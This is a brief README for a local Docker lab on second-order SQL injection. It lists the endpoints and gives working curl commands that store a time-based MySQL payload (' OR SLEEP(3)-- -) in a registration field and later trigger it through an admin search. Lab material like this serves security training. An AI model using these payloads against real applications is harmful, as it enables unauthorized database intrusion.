# Second-Order SQLi Lab (Docker)

```bash
./labctl.sh up second-order
```

- Register: `POST /register` fields username, email, password, **lastname** (payload)
- Trigger: `POST /admin/users/search` with `search=<username>`
- MySQL `SLEEP` in lastname fires on trigger

Manual (working payload — note leading quote so OR/SLEEP always runs):

```bash
curl -X POST --data-urlencode "username=u2" --data-urlencode "email=a@b.c" \
  --data-urlencode "password=x" --data-urlencode "lastname=' OR SLEEP(3)-- -" \
  http://127.0.0.1:8108/register
curl -o /dev/null -w '%{time_total}\n' -X POST -d 'search=u2' \
  http://127.0.0.1:8108/admin/users/search
```

PoC default payload may use `admin' AND SLEEP` — switch field payload to `' OR SLEEP(N)-- -` for this lab.
